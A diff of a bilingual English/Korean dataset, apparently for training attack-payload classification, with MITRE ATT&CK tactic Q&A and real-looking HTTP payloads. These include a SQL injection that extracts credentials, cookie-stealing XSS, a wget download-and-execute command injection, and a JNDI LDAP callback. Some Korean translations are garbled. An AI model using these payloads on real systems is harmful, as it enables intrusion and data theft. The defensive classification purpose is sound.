+How many enterprise Tactics IDs in the Mitre Att&ck v13 matrix?,Mitre Att&ck v13 matrix의 Enterprise Tactics ID는 몇 개입니까?,,,"as of the mitre att&ck v13 framework, there are 14 enterprise tactics in the matrix. these tactics represent the various phases of a cyber attack life cycle. each tactic consists of multiple techniques that adversaries use to achieve their objectives.","mitre att&ck v13 프레임워크에 따르면, matrix에는 14개의 enterprise tactics이 있습니다. 이러한 전술들은 사이버 공격 수명주기의 다양한 단계를 나타냅니다. 각 전술은 적들이 목표를 달성하기 위해 사용하는 다양한 기술로 구성되어 있습니다."
+What is TA0043 (Reconnaissance)?,TA0043 (Reconnaissance) 이 뭐야?,,,"ta0043, also known as reconnaissance, is a stage in the cyber kill chain where threat actors actively gather information about their target system or network. this information can include vulnerabilities, it infrastructure details, or user behaviors that can be exploited during an attack. the primary goal of reconnaissance is to gain valuable intelligence that helps plan and execute a successful cyber attack.","ta0043는 reconnaissance로 알려져 있으며, 사이버 킬 체인에서 목표 시스템이나 네트워크에 대한 정보를 적극적으로 수집하는 단계입니다. 이 정보는 공격 중에 악용될 수 있는 취약점, it 인프라 세부 정보 또는 사용자 행동을 포함할 수 있습니다. 정찰의 주요 목표는 성공적인 사이버 공격을 계획하고 실행하는데 도움이 되는 귀중한 정보를 얻는 것입니다."
+What is TA0042 (Resource Development)?,TA0042 (Resource Development) 이 뭐야?,,,"ta0042, or resource development, refers to the phase in the adversarial tactics, techniques, and common knowledge (att&ck) framework where adversaries create or acquire resources necessary for their attack plan. these resources can include acquiring target vulnerabilities, infrastructure setup, and social engineering situations. resource development is a crucial component in a cyber attack lifecycle, as it enables the adversary to build successful strategies and gather required tools to execute an attack.","ta0042 또는 resource development은 적들이 공격 계획에 필요한 자원을 만들거나 획득하는 단계를 의미하는 데, 이것은 적대적 전술, 기법 및 공통 지식(att&ck) 프레임워크의 단계입니다. 이러한 자원에는 목표 취약점 획득, 인프라 구축 및 소셜 엔지니어링 상황이 포함될 수 있습니다. 리소스 개발은 사이버 공격 수명주기에서 중요한 구성 요소이며, 이를 통해 적이 성공적인 전략을 구축하고 공격을 수행하기 위해 필요한 도구를 수집할 수 있습니다."
+What is TA0001 (Initial Access)?,TA0001 (Initial Access)이 뭐야?,,,"ta0001, initial access, refers to the first stage in the cyber-attack lifecycle where an attacker gains an initial foothold in a target network or system. this is commonly achieved through tactics like spear-phishing, exploiting vulnerabilities, or using stolen credentials. the goal of initial access is to establish a presence in the target environment, allowing the attacker to further advance their objectives, such as data theft or system disruption.","ta0001은 initial access로, 사이버 공격 생명주기에서 공격자가 목표 네트워크나 시스템에 초기 입지를 확보하는 첫 단계를 나타냅니다. 이는 특정 피싱(spear-phishing), 취약점을 이용한 공격 또는 도난당한 인증 정보를 사용하는 것과 같은 방식으로 일반적으로 달성됩니다. 초기 액세스의 목적은 대상 환경에 존재를 확립함으로써 공격자가 추가적인 목표를 추진할 수 있도록 하는 것이며, 이는 데이터 도용 또는 시스템 중단과 같은 목표를 포함합니다."
+What is TA0002 (Execution)?,TA0002 (Execution)이 뭐야?,,,"ta0002, or ""execution,"" is a tactic in the mitre att&ck framework, which refers to the actual carrying out or deployment of a cyber attack by threat actors. it involves the exploitation of system vulnerabilities or the use of malicious software to take control of a targeted system, network, or device. this step is crucial for attackers to achieve their ultimate goal, whether that be stealing confidential data, causing disruption, or spreading malware.","ta0002, 또는 ""execution,""은 mitre att&ck 프레임워크의 전술 중 하나로, 사이버 공격을 수행하거나 배포하는 것을 의미합니다. 이는 시스템 취약점을 악용하거나 악성 소프트웨어를 사용하여 표적 시스템, 네트워크 또는 장치를 제어하는 것을 포함합니다. 공격자가 기밀 데이터를 훔치거나, 중단을 일으키거나, 악성 코드를 퍼뜨리는 것과 같은 궁극적인 목표를 달성하기 위해 이 단계는 매우 중요합니다."
+What is TA0003 (Persistence)?,TA0003 (Persistence)이 뭐야?,,,"ta0003, or persistence, is a tactic used by threat actors in cyber security breaches, aiming to maintain their presence within a system or network even after initial access has been achieved. this allows the attacker to continue accessing the compromised system for data exfiltration, espionage, or further attacks, even after protective measures have been implemented. common persistence techniques include creating backdoors, maintaining privileged user accounts, and deploying malware or rootkits that can survive system reboots and security updates.","ta0003, 또는 persistence,은 사이버 보안 침해에서 위협 행위자들이 초기 접근이 이루어진 후에도 시스템 또는 네트워크 내에 그들의 존재를 유지하도록 하는 전술입니다. 이를 통해 공격자는 보호 조치가 구현된 후에도 손상된 시스템에 지속적으로 액세스하여 데이터 유출, 스파이, 또는 추가 공격을 계속할 수 있습니다. 일반적인 지속성 기술에는 백도어를 생성하고, 특권 사용자 계정을 유지하고, 시스템 재부팅 및 보안 업데이트를 견딜 수 있는 악성 코드나 루트킷을 배포하기가 포함됩니다."
+What is TA0004 (Privilege Escalation)?,TA0004 (Privilege Escalation)이 뭐야?,,,"ta0004, or privilege escalation, refers to a technique used by malicious actors to exploit vulnerabilities or weaknesses in a system, network, or application, in order to gain elevated access or increased permissions. this higher level of privileges allows the attacker to perform sensitive actions, manipulate critical system components, or access restricted data. the ultimate goal is to expand control, compromise system security, and facilitate further malicious activities within the target environment.","ta0004 또는 privilege escalation은 악의적인 행위자가 시스템, 네트워크 또는 애플리케이션의 취약점 또는 약점을 활용하여 승인되지 않은 접근 또는 증가된 권한을 얻기 위해 사용하는 기술을 의미합니다. 이 높은 수준의 권한은 공격자가 민감한 행동을 수행하거나 중요한 시스템 구성 요소를 조작하거나 제한된 데이터에 액세스할 수 있게 합니다. 최종 목표는 통제를 확장하고 시스템 보안을 손상시키며 목표 환경 내에서 추가 악의적 활동을 용이하게하는 것입니다."
+What is TA0005 (Defense Evasion)?,TA0005 (Defense Evasion)이 뭐야?,,,"ta0005, or defense evasion, is a tactic used by cyber attackers to avoid detection by security systems and maintain their presence within targeted networks or systems. it involves techniques such as disabling security software, using obfuscation to hide malicious code, and leveraging legitimate processes to blend in with normal system activity. by evading defense mechanisms, attackers can operate undetected and continue to achieve their goals, leaving organizations at risk of data theft, unauthorized access, and other security issues.","ta0005 또는 defense evasion는 사이버 공격자가 보안 시스템을 피하고 목표로 하는 네트워크나 시스템 내에서 지속적으로 존재할 수 있도록 하는 전술입니다. 이 방법에는 보안 소프트웨어를 사용하지 못하게 하는 것, 악성 코드를 숨기는데 사용되는 난독화 기술 및 정상 시스템 활동과 혼합되어 표면적으로 합법적인 과정을 이용하는 것이 포함됩니다. 공격자들은 이러한 방어 메커니즘을 회피하여 감지되지 않고 작업 할 수 있으며, 이로 인해 조직은 데이터 도난, 무단 액세스 및 기타장에 다른 보안 문제에 직면합니다."
+What is TA0006 (Credential Access)?,TA0006 (Credential Access)이 뭐야?,,,"ta0006, or credential access, is a tactic used by adversaries in the cyber kill chain to steal sensitive information or authentication data, such as usernames and passwords, that allows unauthorized access to systems and networks. this tactic includes various techniques, such as keylogging, credential dumping, and brute force attacks. gaining unauthorized access to credentials can enable attackers to maintain control over compromised systems, escalate privileges, or spread malware within a targeted network.","ta0006 또는 credential access 접근은 귀중한 정보나 인증 데이터(예: 사용자 이름 및 비밀번호)를 도용하여 시스템 및 네트워크에 무단 접근을 허용하는 사이버 킬 체인의 적들에 의한 전술입니다. 이 전술에는 키로깅, 인증 정보 덤프, 무차별 공격과 같은 다양한 기법이 포함됩니다. 인증 정보에 대한 무단 접근은 공격자가 손상된 시스템을 지속적으로 통제하거나, 권한을 에스컬레이션하거나, 대상 네트워크 내에 악성 소프트웨어를 퍼트리는 데 사용될 수 있습니다."
+What is TA0007 (Discovery)?,TA0007 (Discovery)이 뭐야?,,,"ta0007, or ""discovery,"" is a tactic used by adversaries within the cyber threat landscape to gain valuable and sensitive information about a targeted system or network. it typically involves exploring and identifying the target's weaknesses, configurations, security measures, and resources. the ultimate goal of discovery is to gather critical intelligence that will help adversaries exploit the system or network more efficiently by uncovering vulnerabilities and potential entry points.","ta0007, 또는 ""디스커버리(discovery)""는 사이버 위협 환경에서 대상 시스템 또는 네트워크에 대한 소중하고 민감한 정보를 얻기 위해 적들이 사용하는 전술입니다. 일반적으로 대상의 약점, 구성, 보안 조치 및 자원을 탐색하고 식별하는 것을 포함합니다. 디스커버리의 궁극적인 목표는 취약성 및 잠재적 진입점을 찾아내어 시스템이나 네트워크를 더 효율적으로 공격할 수 있는 중요한 정보를 수집하는 것입니다."
+What is TA0008 (Lateral Movement)?,TA0008 (Lateral Movement)이 뭐야?,,,"ta0008, or lateral movement, refers to the techniques employed by attackers to move through a network after gaining initial access, with the goal of gaining control over additional systems or gathering sensitive information. this often involves the exploitation of authentication methods, privilege escalation, and the use of compromised credentials. the lateral movement phase is crucial for attackers to maintain persistence and significantly increases the potential impact of a security breach.","ta0008 또는 lateral movement은 공격자가 초기 접근을 얻은 후 네트워크를 통해 이동하여 추가 시스템을 제어하거나 민감한 정보를 수집하는 것을 목표로 하는 기술을 의미합니다. 이러한 과정은 인증 방법의 악용, 권한 상승 및 손상된 자격 증명의 사용을 포함합니다. 수평 이동 단계는 공격자가 지속성을 유지하고 보안 침해의 잠재적 영향을 크게 높이기 위해 필수적입니다."
+What is TA0009 (Collection)?,TA0009 (Collection)이 뭐야?,,,"ta0009, or collection, is a tactic in the mitre att&ck framework that refers to the gathering and accumulation of data by a threat actor after they have penetrated a targeted system. the collected information may include sensitive files, emails, intellectual property, personally identifiable information (pii), or login credentials. this tactic enables attackers to exfiltrate the collected data or use it for further malicious activities, such as espionage, blackmail, or financial gain.","ta0009 또는 collection은 미터 애트 앤드 맥(mitre att & ck) 프레임 워크의 전술로, 위협 행위자가 목표 시스템에 침투 한 후 데이터를 수집하고 축적하는 것을 말합니다. 수집된 정보에는 민감한 파일, 이메일, 지적 재산권, 개인 식별 정보 (pii), 로그인 자격 증명 등이 포함될 수 있습니다. 이 전술을 통해 공격자는 수집한 데이터를 판독하거나 다른 악의적인 활동에 사용할 수 있습니다. 예를 들어, 스파이, 협박 또는 금전적 이익을 얻기 위해 데이터를 수집합니다."
+What is TA0011 (Command and Control)?,TA0011 (Command and Control)이 뭐야?,,,"ta0011, or command and control, is a tactic used by adversaries in the cyber threat landscape to maintain a communication channel between the compromised systems and their own infrastructure. this allows the attacker to remotely control and manipulate the targeted system, often for extracting valuable information, deploying additional malicious software or escalating attacks. this tactic is part of the mitre att&ck framework, which is a globally-accessible knowledge base of adversary tactics and techniques used in cyber attacks.","보안 분석가입니다. ta0011 또는 command and control는 사이버 위협 환경에서 적들이 손상된 시스템과 자신들의 인프라 사이에 의사소통 채널을 유지하기 위해 사용하는 전술입니다. 이를 통해 공격자는 대상 시스템을 원격으로 제어하고 조작할 수 있으며, 종종 중요한 정보를 추출하거나 악성 소프트웨어를 추가로 배포하거나 공격을 확대하는 데 사용합니다. 이 전략은 mitre att&ck 프레임워크의 일부로, 전 세계적으로 접근 가능한 적의 전술 및 기술에 대한 지식베이스를 사용한 사이버 공격이 포함되어 있습니다."
+What is TA0010 (Exfiltration)?,TA0010 (Exfiltration)이 뭐야?,,,"ta0010 (exfiltration) refers to the unauthorized transfer of data from a victim's system to an external destination, typically controlled by an adversary. this data theft can be performed using various methods, such as exfiltrating data over an encrypted channel or through alternate communication protocols to avoid detection. exfiltration is a critical component of cyber attacks, as it allows the attacker to obtain sensitive information, exploit intellectual property, or disrupt operations.","ta0010 (exfiltration)은 피해자의 시스템에서 외부 목적지(일반적으로 적이 제어하는)로 데이터를 무단으로 이전하는 것을 의미합니다. 이 데이터 도난은 암호화 된 채널 또는 대체 통신 프로토콜을 통해 데이터를 유출하여 감지를 피하는 등 다양한 방법으로 수행할 수 있습니다. 유출은 사이버 공격의 중요한 구성 요소로, 공격자가 민감한 정보를 얻거나 지적 재산을 악용하거나 작업을 중단할 수 있게 합니다."
+What is TA0040 (Impact)?,TA0040 (Impact)이 뭐야?,,,"ta0040, also known as ""impact,"" is a tactic used by threat actors in the mitre att&ck framework that primarily focuses on disrupting the integrity or availability of targeted systems or data. this tactic involves activities such as data destruction, resource hijacking, and defacement of webpages. the ultimate goal of the attackers using this tactic is to cause damage or harm to the targeted organization, its reputation, or its operations.","ta0040, ""impact""라고도 알려져 있는 것은 mitre att&ck 프레임워크에서 위협 행위자가 사용하는 전술로, 주로 대상 시스템 또는 데이터의 무결성이나 가용성을 방해하는 것에 초점을 맞춥니다. 이 전략에는 데이터 파괴, 리소스 계란 및 웹페이지 훼손과 같은 활동이 포함됩니다. 이 전략을 사용하는 공격자의 최종 목표는 타겟 조직, 그 명성 또는 그 운영에 손해나 피해를 입히는 것입니다."
+"For a total of 7 types of attacks, including SQL Injection, Command Injection, XSS (Cross Site Scripting), Attempts to access the admin page, JNDI Injection, WordPress vulnerability, and Malicious Bot, please write in 3 sentences what type of attack the following payload.","SQL Injection, Command Injection, XSS(Cross Site Scripting), 관리자 페이지 접근 시도, JNDI Injection, WordPress 취약점, Malicious Bot 등 총 7종의 공격 유형에서 다음 payload의 해당하는 공격 유형을 3문장으로 작성해주세요.","Payload is GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
 Content-Length: 36
 Content-Type: application/x-www-form-urlencoded
 Host: www.test.go.kr
 Connection: Keep-Alive
-User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None).","Since the input payload has union~all~select~from phrase, it is a type of SQL Injection attack."
-Explain the following payload.,"Payload is GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None).","Payload는 GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Host: www.test.go.kr
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) 이다.",the given payload is an example of an sql injection attack. the attacker tries to manipulate the database query by injecting malicious sql code in the request parameter. this can potentially allow unauthorized access to sensitive data or unauthorized actions on the targeted website.,주어진 payload는 sql injection 공격의 예입니다. 공격자는 요청 매개 변수에 악의적인 sql 코드를 주입하여 데이터베이스 쿼리를 조작하려고 합니다. 이로 인해 민감한 데이터에 대한 무단 접근이 허용되거나 대상 웹 사이트에서 무단 조치를 취할 수 있습니다.
+"For a total of 7 types of attacks, including SQL Injection, Command Injection, XSS (Cross Site Scripting), Attempts to access the admin page, JNDI Injection, WordPress vulnerability, and Malicious Bot, please write in 3 sentences what type of attack the following payload.","SQL Injection, Command Injection, XSS(Cross Site Scripting), 관리자 페이지 접근 시도, JNDI Injection, WordPress 취약점, Malicious Bot 등 총 7종의 공격 유형에서 다음 payload의 해당하는 공격 유형을 3문장으로 작성해주세요.","Payload is GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 6
 Host: 10.0.0.100
 User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
-Connection: Keep-Alive.","Since the entered payload has the script~alert phrase, it is a type of XSS (Cross Site Scripting) attack."
-Explain the following payload.,"Payload is GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
+Connection: Keep-Alive.","Payload는 GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Host: 10.0.0.100
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
+Connection: Keep-Alive 이다.","this payload appears to be an attempt at a cross-site scripting (xss) attack. the attacker is injecting a malicious javascript code within the sitename parameter, causing the targeted website to potentially execute the script. this can lead to user data exposure and unauthorized actions within the context of the victim's browser.",이 payload는 크로스 사이트 스크립팅(xss) 공격 시도로 보입니다. 공격자는 sitename 매개 변수 내에 악성 자바스크립트 코드를 삽입하여 대상 웹사이트가 스크립트를 실행할 가능성이 있는 것입니다. 이로 인해 사용자 데이터 노출 및 피해자의 브라우저 상에서 무단으로 작업을 수행할 수 있습니다.
+"For a total of 7 types of attacks, including SQL Injection, Command Injection, XSS (Cross Site Scripting), Attempts to access the admin page, JNDI Injection, WordPress vulnerability, and Malicious Bot, please write in 3 sentences what type of attack the following payload.","SQL Injection, Command Injection, XSS(Cross Site Scripting), 관리자 페이지 접근 시도, JNDI Injection, WordPress 취약점, Malicious Bot 등 총 7종의 공격 유형에서 다음 payload의 해당하는 공격 유형을 3문장으로 작성해주세요.","Payload is GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
 Connection: keep-alive
 Cache-Control: max-age=0
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
 Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9.","The input payload is a Command Injection attack type because the phrases cd~tmp, rm~-rf, and wget~ttp are in front of http_version (HTTP/1.1)."
-Explain the following payload.,"Payload is GET /struts/utils.js HTTP/1.1
+Accept-Language: en-US,en;q=0.9.","Payload는 GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9 이다.","this payload appears to be a command injection attack. it uses a get request to execute multiple shell commands, including removing a file, downloading a file, changing permissions, and executing the downloaded file. this may result in unauthorized access or control of the vulnerable system.","이 payload는 command injection 공격으로 보입니다. get 요청을 사용하여 여러 쉘 명령을 실행하며, 파일 제거, 파일 다운로드, 권한 변경 및 다운로드한 파일 실행을 포함합니다. 이로 인해 취약한 시스템의 무단 접근이나 제어가 발생할 수 있습니다."
+"For a total of 7 types of attacks, including SQL Injection, Command Injection, XSS (Cross Site Scripting), Attempts to access the admin page, JNDI Injection, WordPress vulnerability, and Malicious Bot, please write in 3 sentences what type of attack the following payload.","SQL Injection, Command Injection, XSS(Cross Site Scripting), 관리자 페이지 접근 시도, JNDI Injection, WordPress 취약점, Malicious Bot 등 총 7종의 공격 유형에서 다음 payload의 해당하는 공격 유형을 3문장으로 작성해주세요.","Payload is GET /struts/utils.js HTTP/1.1
 Host: 10.10.123.123
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
-X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}}.","Since the input payload has the phrase jndi~ldap, it is a type of JNDI Injection attack."
-Explain the following payload.,"Payload is GET /phpMyAdmin//iisadminpwd/achg.htr
-/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache.","The entered payload has a phrase that accesses phpmyadmin's setup.php, so it is an attack type that attempts to access the admin page."
-Explain the following payload.,"Payload is GET /robots.txt HTTP/1.1
+X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}}.","Payload는 GET /struts/utils.js HTTP/1.1
+Host: 10.10.123.123
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
+X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}} 이다.","the given payload utilizes a get request to access the /struts/utils.js file. the suspicious aspect of this request is the x-client-ip header, which includes a jndi reference using the `${jndi:ldap://}` syntax. therefore, this request is an example of a jndi injection attack, aiming to exploit potential vulnerabilities in the server's java environment.",주어진 payload는 get 요청을 사용하여 /struts/utils.js 파일에 접근합니다. 이 요청의 수상한 측면은 `${jndi:ldap://}` 구문을 사용하는 x-client-ip 헤더를 포함하고 있다는 것입니다. 따라서 이 요청은 서버의 java 환경에서 잠재적 취약점을 공격하려는 jndi 인젝션 공격의 예입니다.
+"For a total of 7 types of attacks, including SQL Injection, Command Injection, XSS (Cross Site Scripting), Attempts to access the admin page, JNDI Injection, WordPress vulnerability, and Malicious Bot, please write in 3 sentences what type of attack the following payload.","SQL Injection, Command Injection, XSS(Cross Site Scripting), 관리자 페이지 접근 시도, JNDI Injection, WordPress 취약점, Malicious Bot 등 총 7종의 공격 유형에서 다음 payload의 해당하는 공격 유형을 3문장으로 작성해주세요.","Payload is GET /phpMyAdmin//iisadminpwd/achg.htr
+/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache.","Payload는 GET /phpMyAdmin//iisadminpwd/achg.htr
+/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache 이다.","the given payload appears to be an attempt to access sensitive files and directories on the server, specifically targeting phpmyadmin's setup file and iis admin password. this type of attack can be classified as an attempt to access the admin page. the attacker uses a forged user-agent in their request to disguise the origin and appears to be targeting potential vulnerabilities in the server's configuration.","제공된 payload는 서버의 민감한 파일과 디렉토리에 접근하려는 시도로 보이며, 특히 phpmyadmin의 설정 파일과 iis 관리자 비밀번호를 대상으로 합니다. 이러한 공격 유형은 관리자 페이지에 접근하려는 시도로 분류할 수 있습니다. 공격자는 요청에서 위장된 사용자 에이전트를 사용하여 출처를 숨기고 있으며, 서버 구성의 잠재적 취약점을 대상으로 하는 것으로 보입니다."
+"For a total of 7 types of attacks, including SQL Injection, Command Injection, XSS (Cross Site Scripting), Attempts to access the admin page, JNDI Injection, WordPress vulnerability, and Malicious Bot, please write in 3 sentences what type of attack the following payload.","SQL Injection, Command Injection, XSS(Cross Site Scripting), 관리자 페이지 접근 시도, JNDI Injection, WordPress 취약점, Malicious Bot 등 총 7종의 공격 유형에서 다음 payload의 해당하는 공격 유형을 3문장으로 작성해주세요.","Payload is GET /robots.txt HTTP/1.1
 rw-request-time: 1574036860318
 cdn-ip: 10.10.123.123
 referer: http://admin.corea.school
@@ -73,10 +98,617 @@ accept: */*
 x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
 x-cdn-src-port: 33312
 cdn-src-ip: 10.10.123.123
-host: admin.corea.school.",The input payload is of type malicious user-agent since the user-agent is semrushbot.
-Explain the following payload.,"Payload is GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
+host: admin.corea.school.","Payload는 GET /robots.txt HTTP/1.1
+rw-request-time: 1574036860318
+cdn-ip: 10.10.123.123
+referer: http://admin.corea.school
+x-forwarded-for: 10.10.123.123
+connection: close
+x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
+accept-encoding: gzip
+user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
+accept: */*
+x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
+x-cdn-src-port: 33312
+cdn-src-ip: 10.10.123.123
+host: admin.corea.school 이다.","this payload appears to be an attempt to access the admin page of a website. the referrer header and host header point specifically to an admin page on the ""corea.school"" domain. the user-agent header indicates the usage of semrushbot, which could potentially be a malicious bot in this context if it's being used to access restricted admin pages.","이 payload는 웹 사이트의 관리자 페이지에 액세스하려는 시도로 보입니다. 리퍼러 헤더와 호스트 헤더는 ""corea.school"" 도메인의 관리자 페이지를 특정합니다. 사용자 에이전트 헤더는 semrushbot의 사용을 나타냅니다. 이 경우 제한된 관리자 페이지에 액세스하는 데 사용되는 경우 악의적인 봇이 될 수 있습니다."
+"For a total of 7 types of attacks, including SQL Injection, Command Injection, XSS (Cross Site Scripting), Attempts to access the admin page, JNDI Injection, WordPress vulnerability, and Malicious Bot, please write in 3 sentences what type of attack the following payload.","SQL Injection, Command Injection, XSS(Cross Site Scripting), 관리자 페이지 접근 시도, JNDI Injection, WordPress 취약점, Malicious Bot 등 총 7종의 공격 유형에서 다음 payload의 해당하는 공격 유형을 3문장으로 작성해주세요.","Payload is GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
 Accept: text/html application/xhtml+xml image/jxr */*
 Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
 Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
 Host: owa.corea.school
-Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3.","Since the input payload accesses /wp-login.php, it is a type of Word Press vulnerability attack."
+Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3.","Payload는 GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
+Accept: text/html application/xhtml+xml image/jxr */*
+Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
+Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
+Host: owa.corea.school
+Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3 이다.","the given payload indicates an attempt to access the admin page, specifically targeting wordpress vulnerabilities. the attacker tries to access the ""wp-login.php"" file, a common entry-point for unauthorized wordpress admin access attempts. additionally, the ""referer"" address suggests the attacker may be coming from an internal network, which could signify a potential insider threat or a compromised device within the organization.","주어진 payload는 관리자 페이지에 접근하려는 시도를 나타내며, 특히 워드프레스 취약점을 대상으로 합니다. 공격자는 ""wp-login.php"" 파일에 접근하려고 시도하는데, 이는 무단으로 워드프레스 관리자 권한을 얻기 위한 일반적인 진입점입니다. 또한 ""referer"" 주소는 공격자가 내부 네트워크에서 왔을 수 있다는 것을 나타내며, 이는 조직 내부의 협박이나 손상된 장치가 있을 수 있음을 시사합니다."
+"The Mitre Att&ck v13, announced in April 2023, consists of a total of 14 Enterprise Tactics IDs, including TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance).
+For the payload entered out of all 14 Enterprise Tactics IDs in Miter Att&ck v13 announced in April 2023, please write one suitable Tactics ID starting with TA and a description in 2 sentences.","2023년 4월에 발표된 Mitre Att&ck v13은 TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance) 총 14개 입니다.
+2023년 4월에 발표된 Mitre Att&ck v13의 Enterprise Tactics ID 전체 14개 중 입력된 페이로드에 대해 TA로 시작하는 적합한 Tactics ID 하나와 2문장으로 설명을 작성하십시오.","Payload is GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Host: www.test.go.kr
+Connection: Keep-Alive
